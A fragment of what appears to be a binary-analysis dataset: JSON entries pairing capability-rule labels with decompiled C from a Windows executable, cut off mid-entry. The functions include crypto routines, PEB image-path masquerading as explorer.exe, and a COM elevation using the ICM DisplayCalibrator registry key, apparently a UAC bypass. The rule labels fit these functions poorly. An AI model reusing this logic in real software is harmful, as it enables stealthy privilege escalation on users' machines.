        "decompiled_code": "\nuint __cdecl fcn.00407120(int32_t pbBuffer, uint32_t dwLen)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    uint uVar4;\n    bool bVar5;\n    uint phProv;\n    \n    if (*0x416024 == 1) {\n        uVar1 = 0;\n        if (dwLen != 0) {\n            do {\n                do {\n                    uVar4 = rdrand();\n                    bVar5 = rdrandIsValid();\n                    *(uVar1 + pbBuffer) = uVar4;\n                } while (!bVar5);\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < dwLen);\n        }\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"bcrypt.dll\");\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)(&phProv, 0, 0x4112b8, 1, 0xf0000000);\n            if (iVar2 == 0) {\n                return 0;\n            }\n        }\n        else {\n            pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"BCryptGenRandom\");\n            if (pcVar3 != NULL) {\n                (*pcVar3)(0, pbBuffer, dwLen, 2);\n                return 1;\n            }\n            iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextW)\n                              (&phProv, 0, L\"Microsoft Base Cryptographic Provider v1.0\", 1, 0xf0000000);\n            if (iVar2 == 0) {\n                return 0;\n            }\n        }\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenRandom)(phProv, dwLen, pbBuffer);\n        if (iVar2 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CryptReleaseContext)(phProv, 0);\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 465
    },
    "004075f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004075f0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t in_FS_OFFSET;\n    uint lpString2;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_FS_OFFSET + 0x18) + 0x30);\n    if (arg_8h == 0) {\n        *0x416058 = 0;\n        var_3ch = 0x1000;\n        iVar3 = (*_sym.imp.ntdll.dll_NtAllocateVirtualMemory)(0xffffffff, 0x416058, 0, &var_3ch, 0x3000, 4);\n        if (-1 < iVar3) {\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(&lpString2, 0x104);\n            var_38h = 0x65005c;\n            var_34h = 0x700078;\n            var_30h = 0x6f006c;\n            var_2ch = 0x650072;\n            var_28h = 0x2e0072;\n            var_24h = 0x780065;\n            var_20h = 0x65;\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x416058, &lpString2);\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(*0x416058, &var_38h);\n        }\n    }\n    (*_sym.imp.ntdll.dll_RtlAcquirePebLock)();\n    pcVar2 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    var_4h._0_2_ = 0;\n    var_1ch = 0x780065;\n    var_18h = 0x6c0070;\n    var_14h = 0x72006f;\n    var_10h = 0x720065;\n    var_ch = 0x65002e;\n    var_8h = 0x650078;\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(*(iVar1 + 0x10) + 0x38, *0x416058);\n    (*pcVar2)(*(iVar1 + 0x10) + 0x40, &var_1ch);\n    (*_sym.imp.ntdll.dll_RtlReleasePebLock)();\n    (*_sym.imp.ntdll.dll_LdrEnumerateLoadedModules)(0, fcn.00407720, arg_8h);\n    return;\n}\n",
        "token_count": 672
    },
    "00407720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407720(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    if (*(arg_8h + 0x18) != *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 8)) {\n        *arg_10h = 0;\n        return;\n    }\n    uVar2 = *0x416050;\n    puVar3 = *0x416054;\n    if (arg_ch == 0) {\n        *0x416054 = *(arg_8h + 0x30);\n        *0x416050 = *(arg_8h + 0x28);\n        var_1ch = 0x65005c;\n        var_18h = 0x700078;\n        var_14h = 0x6f006c;\n        var_10h = 0x650072;\n        var_ch = 0x2e0072;\n        var_8h = 0x780065;\n        var_4h = 0x65;\n        uVar2 = *0x416058;\n        puVar3 = &var_1ch;\n    }\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(arg_8h + 0x24, uVar2);\n    (*pcVar1)(arg_8h + 0x2c, puVar3);\n    *arg_10h = 1;\n    return;\n}\n",
        "token_count": 417
    },
    "004078f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.004078f0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    piVar4 = NULL;\n    var_8h = NULL;\n    var_4h = NULL;\n    iVar2 = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 2);\n    var_30h._0_2_ = 0;\n    var_7ch = 0x33007b;\n    var_78h = 0x350045;\n    var_74h = 0x430046;\n    var_70h = 0x460037;\n    var_6ch = 0x2d0039;\n    var_68h = 0x410039;\n    var_64h = 0x310035;\n    var_60h = 0x34002d;\n    var_5ch = 0x360033;\n    var_58h = 0x2d0037;\n    var_54h = 0x300039;\n    var_50h = 0x330036;\n    var_4ch = 0x41002d;\n    var_48h = 0x320031;\n    var_44h = 0x320030;\n    var_40h = 0x340034;\n    var_3ch = 0x420046;\n    var_38h = 0x430045;\n    var_34h = 0x7d0037;\n    uVar3 = fcn.004077d0(&var_7ch, 0x411400, 4, &var_8h);\n    piVar1 = var_8h;\n    if (uVar3 == 0) {\n        if (var_8h == NULL) {\n            uVar3 = 0x8007000e;\n            goto code_r0x00407c75;\n        }\n        var_2ch = 0x690044;\n        var_28h = 0x700073;\n        var_24h = 0x61006c;\n        var_20h = 0x430079;\n        var_1ch = 0x6c0061;\n        var_18h = 0x620069;\n        var_14h = 0x610072;\n        var_10h = 0x6f0074;\n        var_ch = 0x72;\n        var_148h = 0x6f0053;\n        var_144h = 0x740066;\n        var_140h = 0x610077;\n        var_13ch = 0x650072;\n        var_138h = 0x4d005c;\n        var_134h = 0x630069;\n        var_130h = 0x6f0072;\n        var_12ch = 0x6f0073;\n        var_128h = 0x740066;\n        var_124h = 0x57005c;\n        var_120h = 0x6e0069;\n        var_11ch = 0x6f0064;\n        var_118h = 0x730077;\n        var_114h = 0x4e0020;\n        var_110h = 0x5c0054;\n        var_10ch = 0x750043;\n        var_108h = 0x720072;\n        var_104h = 0x6e0065;\n        var_100h = 0x560074;\n        var_fch = 0x720065;\n        var_f8h = 0x690073;\n        var_f4h = 0x6e006f;\n        var_f0h = 0x49005c;\n        var_ech = 0x4d0043;\n        var_e8h = 0x43005c;\n        var_e4h = 0x6c0061;\n        var_e0h = 0x620069;\n        var_dch = 0x610072;\n        var_d8h = 0x690074;\n        var_d4h = 0x6e006f;\n        var_d0h._0_2_ = 0;\n        uVar3 = (**(*var_8h + 0x28))(var_8h, 0x80000002, &var_148h, &var_2ch, arg_8h);\n        if (-1 < uVar3) {\n            var_cch = 0x44007b;\n            var_80h._0_2_ = 0;\n            var_c8h = 0x450032;\n            var_c4h = 0x300037;\n            var_c0h = 0x310034;\n            var_bch = 0x2d0042;\n            var_b8h = 0x390032;\n            var_b4h = 0x370032;\n            var_b0h = 0x34002d;\n            var_ach = 0x660032;\n            var_a8h = 0x2d0062;\n            var_a4h = 0x450038;\n            var_a0h = 0x460039;\n            var_9ch = 0x37002d;\n            var_98h = 0x450043;\n            var_94h = 0x330039;\n            var_90h = 0x360042;\n            var_8ch = 0x430044;\n            var_88h = 0x330039;\n            var_84h = 0x7d0037;\n            uVar3 = fcn.004077d0(&var_cch, 0x411410, 4, &var_4h);\n            piVar4 = var_4h;\n            if (uVar3 == 0) {\n                if (var_4h == NULL) {\n                    uVar3 = 0x8007000e;\n                }\n                else {\n                    uVar3 = (**(*var_4h + 0x38))(var_4h, 0);\n                }\n            }\n        }\n    }\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))(piVar1);\n    }\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4);\n    }\ncode_r0x00407c75:\n    if (iVar2 == 0) {\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return ~uVar3 >> 0x1f;\n}\n",
        "token_count": 2060
    },
    "00408f80": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00408f80(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uchar (*arg_14h) [16], uchar (*arg_18h) [16], \n            uchar (*arg_1ch) [16])\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uchar (*pauVar5) [16];\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t var_4h;\n    \n    if (arg_10h != 0) {\n        iVar7 = arg_14h - arg_18h;\n        var_4h = (arg_10h - 1U >> 4) + 1;\n        do {\n            if (((*arg_18h + 0xf < arg_1ch) || (*arg_1ch + 0xf < arg_18h)) &&\n               ((*arg_14h + 0xf < arg_1ch || (*arg_1ch + 0xf < arg_14h)))) {\n                *arg_1ch = *arg_18h ^ *arg_14h;\n            }\n            else {\n                iVar6 = 0x10;\n                pauVar5 = arg_18h;\n                do {\n                    (arg_1ch + (-1 - arg_18h))[*pauVar5 + 1] = (*pauVar5)[iVar7] ^ (*pauVar5)[0];\n                    iVar6 = iVar6 + -1;\n                    pauVar5 = *pauVar5 + 1;\n                } while (iVar6 != 0);\n            }\n            if (arg_ch == 1) {\n                fcn.00409b60(arg_8h, arg_1ch, arg_1ch);\n            }\n            else {\n                fcn.004095c0(arg_8h, arg_1ch, arg_1ch);\n            }\n            puVar4 = *arg_1ch;\n            uVar1 = *(*arg_1ch + 4);\n            uVar2 = *(*arg_1ch + 8);\n            uVar3 = *(*arg_1ch + 0xc);\n            arg_1ch = arg_1ch[1];\n            iVar7 = iVar7 + -0x10;\n            arg_18h = arg_18h[1];\n            var_4h = var_4h + -1;\n            **arg_14h = *puVar4;\n            *(*arg_14h + 4) = uVar1;\n            *(*arg_14h + 8) = uVar2;\n            *(*arg_14h + 0xc) = uVar3;\n        } while (var_4h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 615
    },
    "00409050": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409050(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00409b60(arg_8h, arg_10h, arg_14h);\n        return;\n    }\n    fcn.004095c0(arg_8h, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 100
    },
    "0040c0e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c0e0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = arg_8h;\n    var_ch = 1;\n    arg_8h = 0;\n    var_18h = 1;\n    var_8h = *(iVar1 + 4);\n    var_4h = *(iVar1 + 8);\n    var_10h = &arg_8h;\n    var_14h = 1;\n    iVar1 = fcn.0040a4b0(&var_ch, &var_18h);\n    if (iVar1 != 0) {\n        var_10h = &arg_8h;\n        arg_8h = 1;\n        var_18h = 1;\n        var_14h = 1;\n        iVar1 = fcn.0040a4b0(&var_ch, &var_18h);\n        if (iVar1 != 0) {\n            var_10h = &arg_8h;\n            arg_8h = 2;\n            var_18h = 1;\n            var_14h = 1;\n            iVar1 = fcn.0040a4b0(&var_ch, &var_18h);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            iVar1 = fcn.0040cd70(&var_ch);\n            if (iVar1 != 0) {\n                if (iVar1 != 1) {\n                    return iVar1;\n                }\n                return 0;\n            }\n            iVar1 = fcn.0040ce10(&var_ch, arg_ch, arg_10h, arg_14h);\n            return iVar1;\n        }\n    }\n    return -0xe;\n}\n",
        "token_count": 447
    },
    "0040c220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c220(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = arg_8h[1];\n    if (iVar2 == 0) {\n        iVar1 = sub.msvcrt.dll_calloc(1, 4);\n        if (iVar1 == 0) {\n            return 0xfffffff0;\n        }\n        if (arg_8h[2] != 0) {\n            fcn.004013a0(iVar1, arg_8h[2], arg_8h[1] << 2);\n            fcn.0040ef10(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        arg_8h[1] = 1;\n        iVar2 = 1;\n        arg_8h[2] = iVar1;\n    }\n    fcn.00401000(arg_8h[2], 0, iVar2 << 2);\n    uVar3 = arg_ch >> 0x1f;\n    *arg_8h[2] = (arg_ch ^ uVar3) - uVar3;\n    *arg_8h = (uVar3 & 0xfffffffe) + 1;\n    return 0;\n}\n",
        "token_count": 315
    },
    "0040d800": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040d800(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a470(arg_8h + 8, 0);\n    if (((((iVar1 == 0) || (iVar1 = fcn.0040a470(arg_8h + 0x2c, 0),  iVar1 == 0)) ||\n         (iVar1 = fcn.0040a470(arg_8h + 0x38, 0),  iVar1 == 0)) ||\n        ((iVar1 = fcn.0040a470(arg_8h + 0x20, 0),  iVar1 == 0 || (iVar1 = fcn.0040a470(arg_8h + 0x14, 0),  iVar1 == 0)))\n        ) && ((arg_10h != 0 || ((arg_14h != 0 || (arg_18h != 0)))))) {\n        return -0x4080;\n    }\n    if ((arg_ch != 0) && (iVar1 = fcn.0040a590(arg_ch, arg_8h + 8),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_10h != 0) && (iVar1 = fcn.0040a590(arg_10h, arg_8h + 0x2c),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_14h != 0) && (iVar1 = fcn.0040a590(arg_14h, arg_8h + 0x38),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_18h != 0) && (iVar1 = fcn.0040a590(arg_18h, arg_8h + 0x20),  iVar1 != 0)) {\n        return iVar1;\n    }\n    if ((arg_1ch != 0) && (iVar1 = fcn.0040a590(arg_1ch, arg_8h + 0x14),  iVar1 != 0)) {\n        return iVar1;\n    }\n    return 0;\n}\n",
        "token_count": 538
    },
    "0040de30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040de30(int32_t arg_8h, code *arg_ch, uint arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch, uchar *arg_20h\n            )\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    \n    if (*(arg_8h + 0xa4) != 0) {\n        return -0x4100;\n    }\n    if ((arg_18h + 0xb < arg_18h) || (*(arg_8h + 4) < arg_18h + 0xb)) {\n        return -0x4080;\n    }\n    iVar2 = (*(arg_8h + 4) - arg_18h) + -3;\n    *arg_20h = 0;\n    pcVar3 = arg_20h + 1;\n    if (arg_14h == 0) {\n        if (arg_ch == NULL) {\n            return -0x4080;\n        }\n        *pcVar3 = '\\x02';\n        pcVar3 = arg_20h + 2;\n        while (iVar2 != 0) {\n            iVar2 = iVar2 + -1;\n            iVar4 = 100;\n            do {\n                iVar1 = (*arg_ch)(arg_10h, pcVar3, 1);\n                if (*pcVar3 != '\\0') break;\n                iVar4 = iVar4 + -1;\n                if (iVar4 == 0) goto code_r0x0040deed;\n            } while (iVar1 == 0);\n            if ((iVar4 == 0) || (iVar1 != 0)) {\ncode_r0x0040deed:\n                return iVar1 + -0x4480;\n            }\n            pcVar3 = pcVar3 + 1;\n        }\n    }\n    *pcVar3 = '\\0';\n    fcn.004013a0(pcVar3 + 1, arg_1ch, arg_18h);\n    if (arg_14h != 0) {\n        iVar2 = fcn.0040df20(arg_8h, arg_ch, arg_10h, arg_20h, arg_20h);\n        return iVar2;\n    }\n    iVar2 = fcn.0040e450(arg_8h, arg_20h, arg_20h);\n    return iVar2;\n}\n",
        "token_count": 545
    },
    "0040df20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040df20(uint *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_7ch;\n    uint var_70h;\n    uint var_64h;\n    uint var_58h;\n    uint var_4ch;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_1ch;\n    uint var_10h;\n    uint *var_4h;\n    \n    iVar1 = arg_8h;\n    var_4h = arg_8h + 0x50;\n    iVar3 = fcn.0040e560(arg_8h, 1);\n    if (iVar3 != 0) {\n        return -0x4080;\n    }\n    fcn.0040bb10(&var_10h);\n    fcn.0040bb10(&var_58h);\n    fcn.0040bb10(&var_64h);\n    fcn.0040bb10(&var_28h);\n    if (arg_ch != 0) {\n        fcn.0040bb10(&var_34h);\n        fcn.0040bb10(&var_40h);\n    }\n    fcn.0040bb10(&var_1ch);\n    fcn.0040bb10(&var_4ch);\n    fcn.0040bb10(&var_7ch);\n    fcn.0040bb10(&var_70h);\n    iVar3 = fcn.0040c710(&var_10h, arg_14h, *(arg_8h + 4));\n    if (iVar3 == 0) {\n        iVar3 = fcn.0040a4b0(&var_10h, arg_8h + 8);\n        if (iVar3 < 0) {\n            iVar4 = fcn.0040a590(&var_7ch, &var_10h);\n            iVar3 = iVar4;\n            if (iVar4 == 0) {\n                puVar2 = arg_8h + 0x44;\n                if (arg_ch != 0) {\n                    arg_8h_00 = arg_8h + 0x8c;\n                    if (*(arg_8h + 0xa0) == 0) {\n                        do {\n                            iVar4 = iVar4 + 1;\n                            iVar3 = fcn.0040b300(arg_8h + 0x98, *(arg_8h + 4) + -1, arg_ch, arg_10h);\n                            if ((iVar3 != 0) ||\n                               (iVar3 = fcn.0040b450(arg_8h_00, arg_8h + 0x98, arg_8h + 8),  iVar3 != 0))\n                            goto code_r0x0040e3c7;\n                            iVar3 = fcn.0040a470(arg_8h_00, 1);\n                            if (iVar3 == 0) {\n                                iVar3 = fcn.0040bb30(arg_8h_00, arg_8h + 0x98, arg_8h + 8);\n                                if (iVar3 != 0) goto code_r0x0040e3c7;\n                                iVar3 = fcn.0040ac10(arg_8h_00, arg_8h_00, arg_8h + 0x14, arg_8h + 8, arg_8h + 0x68);\n                                goto code_r0x0040e131;\n                            }\n                        } while (iVar4 < 0xb);\n                        iVar3 = -0x4480;\n                        goto code_r0x0040e3c7;\n                    }\n                    iVar3 = fcn.0040c540(arg_8h_00, arg_8h_00, arg_8h_00);\n                    if ((iVar3 != 0) || (iVar3 = fcn.0040c360(arg_8h_00, arg_8h_00, arg_8h + 8),  iVar3 != 0))\n                    goto code_r0x0040e3c7;\n                    iVar3 = arg_8h + 0x98;\n                    iVar3 = fcn.0040c540(iVar3, iVar3, iVar3);\n                    if (iVar3 != 0) goto code_r0x0040e3c7;\n                    iVar3 = fcn.0040c360(arg_8h + 0x98, arg_8h + 0x98, arg_8h + 8);\ncode_r0x0040e131:\n                    if (((((iVar3 != 0) || (iVar3 = fcn.0040c540(&var_10h, &var_10h, arg_8h_00),  iVar3 != 0)) ||\n                         (iVar3 = fcn.0040c360(&var_10h, &var_10h, arg_8h + 8),  iVar3 != 0)) ||\n                        ((iVar3 = fcn.0040cb40(&var_58h, arg_8h + 0x2c, 1),  iVar3 != 0 ||\n                         (iVar3 = fcn.0040cb40(&var_64h, arg_8h + 0x38, 1),  iVar3 != 0)))) ||\n                       ((iVar3 = fcn.0040b300(&var_28h, 0x1c, arg_ch, arg_10h),  iVar3 != 0 ||\n                        ((iVar3 = fcn.0040c540(&var_34h, &var_58h, &var_28h),  iVar3 != 0 ||\n                         (iVar3 = fcn.0040a300(&var_34h, &var_34h, arg_8h + 0x44),  iVar3 != 0))))))\n                    goto code_r0x0040e3c7;\n                    iVar3 = fcn.0040b300(&var_28h, 0x1c, arg_ch, arg_10h);\n                    if ((iVar3 != 0) ||\n                       ((iVar3 = fcn.0040c540(&var_40h, &var_64h, &var_28h),  iVar3 != 0 ||\n                        (iVar3 = fcn.0040a300(&var_40h, &var_40h, arg_8h + 0x50),  iVar3 != 0)))) goto code_r0x0040e3c7;\n                    var_4h = &var_40h;\n                    puVar2 = &var_34h;\n                }\n                arg_8h = puVar2;\n                iVar3 = fcn.0040ac10(&var_1ch, &var_10h, arg_8h, iVar1 + 0x2c, iVar1 + 0x74);\n                if (((((iVar3 == 0) &&\n                      (iVar3 = fcn.0040ac10(&var_4ch, &var_10h, var_4h, iVar1 + 0x38, iVar1 + 0x80),  iVar3 == 0)) &&\n                     (iVar3 = fcn.0040cb80(&var_10h, &var_1ch, &var_4ch),  iVar3 == 0)) &&\n                    (((iVar3 = fcn.0040c540(&var_1ch, &var_10h, iVar1 + 0x5c),  iVar3 == 0 &&\n                      (iVar3 = fcn.0040c360(&var_10h, &var_1ch, iVar1 + 0x2c),  iVar3 == 0)) &&\n                     ((iVar3 = fcn.0040c540(&var_1ch, &var_10h, iVar1 + 0x38),  iVar3 == 0 &&\n                      (iVar3 = fcn.0040a300(&var_10h, &var_4ch, &var_1ch),  iVar3 == 0)))))) &&\n                   (((arg_ch == 0 ||\n                     ((iVar3 = fcn.0040c540(&var_10h, &var_10h, iVar1 + 0x98),  iVar3 == 0 &&\n                      (iVar3 = fcn.0040c360(&var_10h, &var_10h, iVar1 + 8),  iVar3 == 0)))) &&\n                    (iVar3 = fcn.0040ac10(&var_70h, &var_10h, iVar1 + 0x14, iVar1 + 8, iVar1 + 0x68),  iVar3 == 0)))) {\n                    iVar3 = fcn.0040a4b0(&var_70h, &var_7ch);\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.0040cc20(&var_10h, arg_18h, *(iVar1 + 4));\n                    }\n                    else {\n                        iVar3 = -0x4380;\n                    }\n                }\n            }\n        }\n        else {\n            iVar3 = -4;\n        }\n    }\ncode_r0x0040e3c7:\n    fcn.0040b400(&var_58h);\n    fcn.0040b400(&var_64h);\n    fcn.0040b400(&var_28h);\n    if (arg_ch != 0) {\n        fcn.0040b400(&var_34h);\n        fcn.0040b400(&var_40h);\n    }\n    fcn.0040b400(&var_10h);\n    fcn.0040b400(&var_1ch);\n    fcn.0040b400(&var_4ch);\n    fcn.0040b400(&var_70h);\n    fcn.0040b400(&var_7ch);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    return iVar3 + -0x4300;\n}\n",
        "token_count": 2272
    },
    "0040e660": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e660(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    int32_t arg_ch;\n    uint var_88h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (*(arg_8h + 0x70) == 0) {\n        return -0x40;\n    }\n    arg_ch = 0;\n    if (0 < *(arg_8h + 0x70)) {\n        ppcVar2 = arg_8h + 0x74;\n        var_8h = 0;\n        do {\n            var_4h = 0;\n            if (ppcVar2[4] == 0x1) {\n                var_8h = 1;\n            }\n            iVar1 = (**ppcVar2)(ppcVar2[1], &var_88h, 0x80, &var_4h);\n            if (iVar1 != 0) goto code_r0x0040e700;\n            if (var_4h != 0) {\n                iVar1 = fcn.0040e720(arg_8h, arg_ch, &var_88h, var_4h);\n                if (iVar1 != 0) {\n                    return iVar1;\n                }\n                ppcVar2[2] = ppcVar2[2] + var_4h;\n            }\n            arg_ch = arg_ch + 1;\n            ppcVar2 = ppcVar2 + 5;\n        } while (arg_ch < *(arg_8h + 0x70));\n        if (var_8h != 0) goto code_r0x0040e700;\n    }\n    iVar1 = -0x3d;\ncode_r0x0040e700:\n    fcn.0040ef10(&var_88h, 0x80);\n    return iVar1;\n}\n",
        "token_count": 431
    },
    "0040e720": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
